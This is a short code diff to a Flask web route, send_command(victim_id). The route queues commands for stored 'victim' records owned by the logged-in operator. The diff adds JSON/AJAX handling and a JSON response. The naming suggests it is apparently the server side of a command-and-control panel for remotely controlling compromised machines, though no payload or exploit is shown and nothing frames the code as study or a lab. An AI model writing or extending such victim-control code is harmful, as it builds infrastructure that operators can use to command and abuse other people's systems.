@@ -270,8 +270,14 @@ def send_command(victim_id):
     if victim.user_id != session['user_id']:
         return jsonify({'error': 'Unauthorized'}), 403
 
-    command_type = request.form.get('type')
-    command_data = request.form.get('data', '')
+    # Accept both JSON and form data
+    if request.is_json:
+        data = request.json
+        command_type = data.get('type')
+        command_data = data.get('data', {})
+    else:
+        command_type = request.form.get('type')
+        command_data = request.form.get('data', '')
 
     # Build command
     command = {
@@ -295,6 +301,10 @@ def send_command(victim_id):
     pending.append(command)
     victim.pending_commands = json.dumps(pending)
     db.session.commit()
+
+    # Return JSON for AJAX, redirect for forms
+    if request.is_json:
+        return jsonify({'success': True, 'command_id': command['id']})
 
     flash(f'Command "{command_type}" queued for {victim.username}', 'success')
     return redirect(url_for('victim_detail', victim_id=victim_id))
